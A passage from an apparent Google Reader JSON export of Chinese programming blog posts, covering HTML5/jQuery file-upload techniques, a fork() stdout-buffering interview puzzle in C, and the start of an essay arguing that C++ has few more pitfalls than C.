src=\"http://image.beekka.com/blog/201208/bg2012080903.png\"></p>\n\n<p>用户先选择文件，然后点击\"Upload\"按钮，文件开始上传。</p>\n\n<p><strong>二、iframe上传</strong></p>\n\n<p>传统的表单上传，属于\"同步上传\"。也就是说，点击上传按钮后，网页\"锁死\"，用户只能等待上传结束，然后浏览器刷新，跳到表单的action属性指定的网址。</p>\n\n<p>有没有办法\"异步上传\"，在网页不重载的情况下，完成整个上传过程呢？</p>\n\n<p>在HTML5没有出现之前，只能使用iframe做到这一点。用户点击submit时，动态插入一个iframe元素（以下代码使用了jQuery函数库）。</p>\n\n<blockquote>\n\n<p>　　var form = $(\"#upload-form\");</p>\n\n<p>　　form.on('submit',function() {</p>\n\n<p>　　　　// 此处动态插入iframe元素</p>\n\n<p>　　});</p>\n\n</blockquote>\n\n<p>插入iframe的代码如下：</p>\n\n<blockquote>\n\n<p>　　var seed = Math.floor(Math.random() * 1000);</p>\n\n<p>　　var id = \"uploader-frame-\" + seed;</p>\n\n<p>　　var callback = \"uploader-cb-\" + seed;</p>\n\n<p>　　var iframe = $(&#39;&lt;iframe id=&quot;&#39;+id+&#39;&quot; name=&quot;&#39;+id+&#39;&quot; style=&quot;display:none;&quot;&gt;&#39;);</p>\n\n<p>　　var url = form.attr('action');</p>\n\n<p>　　<strong>form.attr('target', id).append(iframe).attr('action', url + '?iframe=' + callback);</strong></p>\n\n</blockquote>\n\n<p>最后一行，有两个地方值得注意。首先，它为表单添加target属性，指向动态插入的iframe窗口，这使得上传结束后，服务器将结果返回iframe窗口，所以当前页面就不会跳转了。其次，它在action属性指定的上传网址的后面，添加了一个参数，使得服务器知道回调函数的名称。这样就能将服务器返回的信息，从iframe窗口传到上层页面。</p>\n\n<p>服务器（upload.php）返回的信息，应该是如下形式：</p>\n\n<blockquote>\n\n<p>　　&lt;script type=&quot;text/javascript&quot;&gt;</p>\n\n<p>　　　　window.top.window['callback'](data);</p>\n\n<p>　　&lt;/script&gt;</p>\n\n</blockquote>\n\n<p>然后，在当前网页定义回调函数：</p>\n\n<blockquote>\n\n<p>　　window[callback] = function(data){</p>\n\n<p>　　　　console.log('received callback:', data);</p>\n\n<p>　　　　iframe.remove(); //removing iframe</p>\n\n<p>　　　　form.removeAttr('target');</p>\n\n<p>　　　　form.attr('action', url);</p>\n\n<p>　　　　window[callback] = undefined; //removing callback</p>\n\n<p>　　};</p>\n\n</blockquote>\n\n<p><strong>三、ajax上传</strong></p>\n\n<p>HTML5提出了XMLHttpRequest对象的<a href=\"http://www.w3.org/TR/XMLHttpRequest/\">第二版</a>，从此ajax能够上传文件了。这是真正的\"异步上传\"，是将来的主流。上一节的iframe上传，可以用作老式浏览器的替代方案。</p>\n\n<p>ajax上传代码，放在表单的submit事件回调函数中：</p>\n\n<blockquote>\n\n<p>　　form.on('submit',function() {</p>\n\n<p>　　　　// 此处进行ajax上传</p>\n\n<p>　　});</p>\n\n</blockquote>\n\n<p>我们主要用的是<a href=\"https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/FormData\">FormData对象</a>，它能够构建类似表单的键值对。</p>\n\n<blockquote>\n\n<p>　　// 检查是否支持FormData<br>\n　　if(window.FormData) {　</p>\n\n<p>　　　　var formData = new FormData();</p>\n\n<p>　　　　// 建立一个upload表单项，值为上传的文件<br>\n　　　　formData.append('upload', document.getElementById('upload').files[0]);</p>\n\n<p>　　　　var xhr = new XMLHttpRequest();</p>\n\n<p>　　　　xhr.open('POST', $(this).attr('action'));</p>\n\n<p>　　　　// 定义上传完成后的回调函数<br>\n　　　　xhr.onload = function () {</p>\n\n<p>　　　　　　if (xhr.status === 200) {</p>\n\n<p>　　　　　　　　console.log('上传成功');</p>\n\n<p>　　　　　　} else {</p>\n\n<p>　　　　　　　　console.log('出错了');</p>\n\n<p>　　　　　　}</p>\n\n<p>　　　　};</p>\n\n<p>　　　　xhr.send(formData);</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p><strong>四、进度条</strong></p>\n\n<p>XMLHttpRequest第二版还定义了一个<a href=\"https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/Using_XMLHttpRequest#Monitoring_progress\">progress事件</a>，可以用来制作进度条。</p>\n\n<p>首先，在页面中放置一个HTML元素progress。</p>\n\n<blockquote>\n\n<p>　　&lt;progress id=&quot;uploadprogress&quot; min=&quot;0&quot; max=&quot;100&quot; value=&quot;0&quot;&gt;0&lt;/progress&gt;</p>\n\n</blockquote>\n\n<p>然后，定义progress事件的回调函数。</p>\n\n<blockquote>\n\n<p>　　xhr.upload.onprogress = function (event) {</p>\n\n<p>　　　　if (event.lengthComputable) {</p>\n\n<p>　　　　　　var complete = (event.loaded / event.total * 100 | 0);</p>\n\n<p>　　　　　　var progress = document.getElementById('uploadprogress');</p>\n\n<p>　　　　　　progress.value = progress.innerHTML = complete;</p>\n\n<p>　　　　}</p>\n\n<p>　　};</p>\n\n</blockquote>\n\n<p>注意，progress事件不是定义在xhr，而是定义在xhr.upload，因为这里需要区分下载和上传，下载也有一个progress事件。</p>\n\n<p><strong>五、图片预览</strong></p>\n\n<p>如果上传的是图片文件，利用<a href=\"http://dev.w3.org/2006/webapi/FileAPI/\">File API</a>，我们可以做一个图片文件的预览。这里主要用到<a href=\"http://www.w3.org/TR/FileAPI/#FileReader-interface\">FileReader对象</a>。</p>\n\n<blockquote>\n\n<p>　　// 检查是否支持FileReader对象<br>\n　　if (typeof FileReader != 'undefined') {</p>\n\n<p>　　　　var acceptedTypes = {<br>\n　　　　　　'image/png': true,<br>\n　　　　　　'image/jpeg': true,<br>\n　　　　　　'image/gif': true<br>\n　　　　};</p>\n\n<p>　　　　if (acceptedTypes[document.getElementById('upload').files[0].type] === true) {</p>\n\n<p>　　　　　　var reader = new FileReader();</p>\n\n<p>　　　　　　reader.onload = function (event) {</p>\n\n<p>　　　　　　　　var image = new Image();</p>\n\n<p>　　　　　　　　image.src = event.target.result;</p>\n\n<p>　　　　　　　　image.width = 100; </p>\n\n<p>　　　　　　　　document.body.appendChild(image);</p>\n\n<p>　　　　　　};</p>\n\n<p>　　　　reader.readAsDataURL(document.getElementById('upload').files[0]);</p>\n\n<p>　　　　}</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p><strong>六、拖放上传</strong></p>\n\n<p>最后，利用HTML5的<a href=\"http://www.w3.org/TR/html5/dnd.html\">拖放功能</a>，实现拖放上传。</p>\n\n<p>先在页面中放置一个容器，用来接收拖放的文件。</p>\n\n<blockquote>\n\n<p>　　&lt;div id=&quot;holder&quot;&gt;&lt;/div&gt;</p>\n\n</blockquote>\n\n<p>对它设置样式：</p>\n\n<blockquote>\n\n<p>　　#holder {<br>\n　　　　border: 10px dashed #ccc;<br>\n　　　　width: 300px;<br>\n　　　　min-height: 300px;<br>\n　　　　margin: 20px auto;<br>\n　　}</p>\n\n<p>　　#holder.hover {<br>\n　　　　border: 10px dashed #0c0;<br>\n　　}</p>\n\n</blockquote>\n\n<p>拖放文件的代码，主要是定义dragover、dragend和drop这三个事件。</p>\n\n<blockquote>\n\n<p>　　// 检查浏览器是否支持拖放上传。<br>\n　　if('draggable' in document.createElement('span')){ </p>\n\n<p>　　　　var holder = document.getElementById('holder');</p>\n\n<p>　　　　holder.ondragover = function () { this.className = 'hover'; return false; };</p>\n\n<p>　　　　holder.ondragend = function () { this.className = ''; return false; };</p>\n\n<p>　　　　holder.ondrop = function (event) {</p>\n\n<p>　　　　　　event.preventDefault();</p>\n\n<p>　　　　　　this.className = '';</p>\n\n<p>　　　　　　var files = event.dataTransfer.files;</p>\n\n<p>　　　　　　// do something with files</p>\n\n<p>　　　　};</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>完成后的效果和总体代码，请看拖放上传<a href=\"http://html5demos.com/dnd-upload\">demo</a>。</p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2012/08/file_upload.html\">http://www.ruanyifeng.com/blog/2012/08/file_upload.html</a></li>\n<li>最后修改时间：2012年9月 6日 13:08</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><strong>[广告]</strong>　<a href=\"http://www.ruanyifeng.com/ads.html\" style=\"border:none\">购买ruanyifeng.com的广告位。</a>\n</p></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1345819323741",
    "timestampUsec" : "1345819323741414",
    "id" : "tag:google.com,2005:reader/item/2d443e4cb0fdb04d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "C/C++语言", "Unix/Linux", "操作系统", "编程语言", "趣味问题", "C++", "fork", "Puzzle", "Unix", "面试" ],
    "title" : "一个fork的面试题",
    "published" : 1343780446,
    "updated" : 1343780446,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7965.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>前两天有人问了个关于Unix的fork()系统调用的面试题，这个题正好是我大约十年前找工作时某公司问我的一个题，我觉得比较有趣，写篇文章与大家分享一下。这个题是这样的：</p>\n<p><strong>题目：请问下面的程序一共输出多少个“-”？</strong></p>\n<pre>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void)\n{\n   int i;\n   for(i=0; i&lt;2; i++){\n      fork();\n      printf(&quot;-&quot;);\n   }\n\n   return 0;\n}</pre>\n<p>如果你对fork()的机制比较熟悉的话，这个题并不难，输出应该是6个“-”，但是，实际上这个程序会很tricky地输出8个“-”。</p>\n<p>要讲清这个题，我们首先需要知道fork()系统调用的特性，</p>\n<p><span></span></p>\n<ul>\n<li>fork()系统调用是Unix下以自身进程创建子进程的系统调用，一次调用，两次返回，如果返回是0，则是子进程，如果返回值&gt;0，则是父进程（返回值是子进程的pid），这是众为周知的。</li>\n</ul>\n<ul>\n<li>还有一个很重要的东西是，在fork()的调用处，整个父进程空间会原模原样地复制到子进程中，包括指令，变量值，程序调用栈，环境变量，缓冲区，等等。</li>\n</ul>\n<p>所以，上面的那个程序为什么会输入8个“-”，这是因为printf(“-”);语句有buffer，所以，对于上述程序，printf(“-”);把“-”放到了缓存中，并没有真正的输出（参看《<a title=\"C语言的谜题\" href=\"http://coolshell.cn/articles/945.html\">C语言的迷题</a>》中的第一题），<strong>在fork的时候，缓存被复制到了子进程空间</strong>，所以，就多了两个，就成了8个，而不是6个。</p>\n<p>另外，多说一下，我们知道，Unix下的设备有“<a href=\"http://en.wikipedia.org/wiki/Device_file#Block_devices\">块设备</a>”和“<a href=\"http://en.wikipedia.org/wiki/Device_file#Character_devices\">字符设备</a>”的概念，所谓块设备，就是以一块一块的数据存取的设备，字符设备是一次存取一个字符的设备。磁盘、内存都是块设备，字符设备如键盘和串口。<strong>块设备一般都有缓存，而字符设备一般都没有缓存</strong>。</p>\n<p>对于上面的问题，我们如果修改一下上面的printf的那条语句为：</p>\n<pre>printf(&quot;-\\n&quot;);</pre>\n<p>或是</p>\n<pre> printf(&quot;-&quot;);\nfflush(stdout);</pre>\n<p>就没有问题了（就是6个“-”了），因为程序遇到“\\n”，或是EOF，或是缓中区满，或是文件描述符关闭，或是主动flush，或是程序退出，就会把数据刷出缓冲区。需要注意的是，标准输出是行缓冲，所以遇到“\\n”的时候会刷出缓冲区，但对于磁盘这个块设备来说，“\\n”并不会引起缓冲区刷出的动作，那是全缓冲，你可以使用setvbuf来设置缓冲区大小，或是用fflush刷缓存。</p>\n<p>我估计有些朋友可能对于fork()还不是很了解，那么我们把上面的程序改成下面这样：</p>\n<pre>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\nint main(void)\n{\n   int i;\n   for(i=0; i&lt;2; i++){\n      fork();\n      //注意：下面的printf有“\\n”\n      printf(&quot;ppid=%d, pid=%d, i=%d \\n&quot;, getppid(), getpid(), i);\n   }\n   sleep(10); //让进程停留十秒，这样我们可以用pstree查看一下进程树\n   return 0;\n}\n</pre>\n<p>于是，上面这段程序会输出下面的结果，（注：编译出的可执行的程序名为fork）</p>\n<pre>ppid=8858, pid=8518, i=0\nppid=8858, pid=8518, i=1\nppid=8518, pid=8519, i=0\nppid=8518, pid=8519, i=1\nppid=8518, pid=8520, i=1\nppid=8519, pid=8521, i=1\n\n$ pstree -p | grep fork\n|-bash(8858)-+-fork(8518)-+-fork(8519)---fork(8521)\n|            |            `-fork(8520)</pre>\n<p>面对这样的图你可能还是看不懂，没事，我好事做到底，画个图给你看看：</p>\n<p><img title=\"fork 程序调用图\" src=\"http://coolshell.cn//wp-content/uploads/2012/07/fork01jpg.jpg\" alt=\"\" width=\"620\" height=\"407\"></p>\n<p>注意：上图中的我用了几个色彩，相同颜色的是同一个进程。于是，我们的pstree的图示就可以成为下面这个样子：（下图中的颜色与上图对应）</p>\n<p><img title=\"fork进程树\" src=\"http://coolshell.cn//wp-content/uploads/2012/07/fork02.jpg\" alt=\"\" width=\"437\" height=\"97\"></p>\n<p>这样，对于printf(“-”);这个语句，我们就可以很清楚的知道，哪个子进程复制了父进程标准输出缓中区里的的内容，而导致了多次输出了。（如下图所示，就是我阴影并双边框了那两个子进程）</p>\n<p><img title=\"fork程序执行图\" src=\"http://coolshell.cn//wp-content/uploads/2012/07/fork03.jpg\" alt=\"\" width=\"626\" height=\"415\"></p>\n<p>现在你明白了吧。（另，对于图中的我本人拙劣的配色，请见谅!）</p>\n<p>（全文完）<br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"又一个有趣的面试题\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F4162.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7965.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">又一个有趣的面试题</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"面试题：赛马问题\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1202.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7965.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/06/21/13619165.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">面试题：赛马问题</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"140个Google的面试题\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3345.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7965.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/07/25/18897251.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">140个Google的面试题</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"面试题：火车运煤问题\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F4429.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7965.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/06/21/13619165.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">面试题：火车运煤问题</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Fork 系统炸弹\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F23.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7965.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Fork 系统炸弹</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table>\n\n<h3>相关文章</h3><ul><li>2011年04月02日 -- <a href=\"http://coolshell.cn/articles/4162.html\">又一个有趣的面试题</a></li><li>2011年03月21日 -- <a href=\"http://coolshell.cn/articles/3961.html\">“火柴棍式”程序员面试题</a></li><li>2011年02月28日 -- <a href=\"http://coolshell.cn/articles/3738.html\">打印质数的各种算法</a></li><li>2011年01月07日 -- <a href=\"http://coolshell.cn/articles/3445.html\">输出从1到1000的数</a></li><li>2009年10月11日 -- <a href=\"http://coolshell.cn/articles/1532.html\">到处都是Unix的胎记</a></li><li>2012年08月16日 -- <a href=\"http://coolshell.cn/articles/8088.html\">对技术的态度</a></li><li>2012年07月05日 -- <a href=\"http://coolshell.cn/articles/7771.html\">少即是极多</a></li></ul></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1345819320812",
    "timestampUsec" : "1345819320812475",
    "id" : "tag:google.com,2005:reader/item/ca24893f40880a6f",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "C/C++语言", "杂项资源", "编程语言", "C++", "Java" ],
    "title" : "C++的坑真的多吗？",
    "published" : 1344211925,
    "updated" : 1344211925,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7992.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>先说明一下，我不希望本文变成语言争论贴。希望下面的文章能让我们客观理性地了解C++这个语言。（另，我觉得技术争论不要停留在非黑即白的二元价值观上，这样争论无非就是比谁的嗓门大，比哪一方的观点强，毫无价值。我们应该多看看技术是怎么演进的，怎么取舍的。）</p>\n<h4>事由</h4>\n<p><img title=\"C Plus Plus\" src=\"http://coolshell.cn//wp-content/uploads/2012/08/cpp_small.jpg\" alt=\"\" width=\"300\" height=\"240\">周五的时候，我在我的微博上发了一个贴说了一下一个网友给我发来的C++程序的规范和内存管理写的不是很好（后来我删除了，因为当事人要求），我并非批判，只是想说明其实程序员是需要一些“疫苗”的，并以此想开一个“程序员疫苗的网站”，结果，@简悦云风同学<a href=\"http://weibo.com/2388714105/yvqWKkcGV\">直接回复到</a>：“<strong>不要用 C++ 直接用 C , 就没那么多坑了。</strong>”就把这个事带入了语言之争。</p>\n<p>我又<a href=\"http://weibo.com/1401880315/yvrMMsCuT\">发了一条微博</a>：</p>\n<p style=\"padding-left:30px\"><a title=\"左耳朵耗子\" href=\"http://weibo.com/1401880315/profile\">@左耳朵耗子</a> <a href=\"http://verified.weibo.com/verify\"><img title=\"新浪个人认证 \" src=\"http://img.t.sinajs.cn/t4/style/images/common/transparent.gif\" alt=\"新浪个人认证 \"></a>： <span style=\"color:#800080\">说C++比C的坑更多的人我可以理解，但理性地思考一下。C语言的坑也不少啊，如果说C语言有90个坑，那么C++就是100个坑（另，<strong>我看很多人都把C语言上的坑也归到了C++上来</strong>），但是C++你得到的东西更多，封装，多态，继承扩展，泛型编程，智能指针，……，你得到了500%东西，但却只多了10%的坑，多值啊</span>。</p>\n<p>结果引来了更多的回复（只节选了一些言论）：</p>\n<ul>\n<li>@淘宝褚霸<a href=\"http://weibo.com/1915508822/yvshunX41\">也在微博里说</a>：“<span style=\"color:#800080\">自从5年前果断扔掉C++，改用了ansi c后，我的生活质量大大提升，没有各种坑坑我。</span>”</li>\n</ul>\n<ul>\n<li>@Laruence<a href=\"http://weibo.com/1170999921/yvsgisAgB\">在其微博里</a>说: “<span style=\"color:#800080\">我确实用不到, C语言灵活运用struct, 可以很好的满足这些需求.//@左耳朵耗子: 封装，继承，多态，模板，智能指针，这也用不到？这也学院派？//@Laruence: 问题是, 这些东西我都用不到… C语言是工程师搞的, C++是学院派搞的</span>”</li>\n</ul>\n<p><strong>那么，C++的坑真的多么？我还请大家理性地思考一下</strong>。</p>\n<p><span></span></p>\n<div>\n<h4>C++真的比C差吗？</h4>\n<p>我们先来看一个图——《<a href=\"http://coolshell.cn/articles/1850.html\">各种程序员的嘴脏的对比</a>》，从这个图上看，C程序员比C++的程序员在注释中使用fuck的字眼多一倍。这说明了什么？<strong>我个人觉得这说明C程序员没有C++程序员淡定</strong>。</p>\n</div>\n<p><img title=\"Google Code 中程序语言出现 fuck 一词的比率\" src=\"http://coolshell.cn//wp-content/uploads/2009/11/programming_language.jpg\" alt=\"Google Code 中程序语言出现 fuck 一词的比率\" width=\"543\" height=\"303\"></p>\n<p>不要太纠结上图，只是轻松一下，我没那么无聊，让我们来看点真正的论据。</p>\n<p>相信用过C++的程序员知道，C++的很多特性主要就是解决C语言中的各种不完美和缺陷：（注：<strong>C89、C99中许多的改进正是从C++中所引进的</strong>）</p>\n<ul>\n<li>用namespace解决了很C函数重名的问题。</li>\n</ul>\n<ul>\n<li>用const/inline/template代替了宏，解决了C语言中宏的各种坑。</li>\n</ul>\n<ul>\n<li>用const的类型解决了很多C语言中变量值莫名改变的问题。</li>\n</ul>\n<ul>\n<li>用引用代替指针，解决了C语言中指针的各种坑。这个在Java里得到彻底地体现。</li>\n</ul>\n<ul>\n<li>用强类型检查和四种转型，解决了C语言中乱转型的各种坑。</li>\n</ul>\n<ul>\n<li>用封装（构造，析构，拷贝构造，赋值重载）解决了C语言中各种复制一个结构体（struct）或是一个数据结构（link, hashtable, list, array等）中浅拷贝的内存问题的各种坑。</li>\n</ul>\n<ul>\n<li>用封装让你可以在成员变量加入getter/setter，而不会像C一样只有文件级的封装。</li>\n</ul>\n<ul>\n<li>用函数重载、函数默认参数，解决了C中扩展一个函数搞出来像func2()之类的ugly的东西。</li>\n</ul>\n<ul>\n<li>用继承多态和RTTI解决了C中乱转struct指针和使用函数指针的诸多让代码ugly的问题。</li>\n</ul>\n<ul>\n<li>用RAII，智能指针的方式，解决了C语言中因为出现需要释放资源的那些非常ugly的代码的问题。</li>\n</ul>\n<ul>\n<li>用OO和GP解决各种C语言中用函数指针，对指针乱转型，及一大砣if-else搞出来的ugly的泛型。</li>\n</ul>\n<ul>\n<li>用STL解决了C语言中算法和数据结构的N多种坑。</li>\n</ul>\n<div>（注意：上面我没有提重载运算符和异常，前者写出来的代码并不易读和易维护（参看《<a title=\"恐怖的C++语言\" href=\"http://coolshell.cn/articles/1724.html\">恐怖的C++语言</a>》后面的那个示例），坑也多，后者并不成熟（相对于Java的异常），但是我们需要知道try-catch这种方式比传统的不断地判断函数返回值和errno形成的大量的if-else在代码可读性上要好很多）</div>\n<p>上述的这些东西填了不知有多少的C语言编程和维护的坑。<strong>少用指针，多用引用，试试autoptr，用用封装，继承，多态和函数重载…… 你面对的坑只会比C少，不会多。</strong></p>\n<h4>C++的坑有多少？</h4>\n<p>C++的坑真的不多，如果你能花两到三周的时候读一下《<a href=\"http://book.douban.com/subject/1231590/\">Effecitve C++</a>》里的那50多个条款，你就知道C++里的坑并不多，而且，有很多条款告诉我们C++是怎么解决C的坑的。然后，你可以读读《<a href=\"http://book.douban.com/subject/1967356/\">Exceptional C++</a>》和《<a href=\"http://book.douban.com/subject/1244943/\">More Exceptional C++</a>》，你可以了解一下C++各种问题的解决方法和一些常见的经典错误。</p>\n<p>当然，C++在解决了很多C语的坑的同时，也因为OO和泛型又引入了一些坑。消一些，加一些，我个人感觉上总体上只比C多10%左右吧。但是你有了开发速度更快，代码更易读，更易维护的500%的利益。</p>\n<p>另外，不可否认的是，C++中的代码出了错误，有时候很难搞，而且似乎用C++的人会觉得C++更容易出错？我觉得主要是下面几个原因：</p>\n<ul>\n<li><strong>C和C++都没学好，大多数人用C++写C，所以，C的坑和C++的坑合并了。</strong></li>\n</ul>\n<ul>\n<li><strong><strong>C++太灵活了，想怎么搞就怎么搞，所以，各种不经意地滥用和乱搞。</strong></strong></li>\n</ul>\n<p>另外，C++的编译对标准C++的实现各异，支持地也千差万别，所以会有一些比较奇怪的问题，但是如果你一般用用C++的封装，继承，多态，以及namespace，const, refernece,  inline, templete, overloap, autoptr，还有一些OO 模式，并不会出现奇怪的问题。</p>\n<p>而对于STL中的各种坑，我觉得是程序员们还对GP（泛型编程）理解得还不够，STL是泛型编程的顶级实践！属于是大师级的作品，一般人很难理解。必需承认STL写出来的代码和编译错误的确相当复杂晦涩，太难懂了。这也是C++的一个诟病。</p>\n<p>这和<a href=\"http://coolshell.cn/articles/1724.html\">Linus说的一样</a> —— “<strong>C++是一门很恐怖的语言，而比它更恐怖的是<span style=\"color:#cc0000\">很多不合格的程序员</span>在使用着它</strong>”。注意我飘红了“<span style=\"color:#cc0000\"><strong>很多不合格的程序员</strong></span>”！</p>\n<p>我觉得C++并不适合初级程序员使用，C++只适合高级程序员使用（参看《<a title=\"“21天教你学会C++”\" href=\"http://coolshell.cn/articles/2250.html\">21天学好C++</a>》和《<a title=\"C++ 程序员自信心曲线图\" href=\"http://coolshell.cn/articles/2287.html\">C++学习自信心曲线</a>》），正如《<a title=\"Why C++ ? 王者归来\" href=\"http://coolshell.cn/articles/6548.html\">Why C++</a>》中说的，C++适合那些对开发维护效率和系统性能同时关注的高级程序员使用。</p>\n<p><strong>这就好像飞机一样，开飞机很难，开飞机要注意的东西太多太多，对驾驶员的要求很高，但你不能说飞机这个工具很烂，开飞机的坑太多。</strong>（注：我这里并不是说C++是飞机，C是汽车，C++和C的差距，比飞机到汽车的差距少太多太多，这里主要是类比，我们对待C++语言的心态！）</p>\n<h4>C++的初衷</h4>\n<p>理解C++设计的最佳读本是《<a 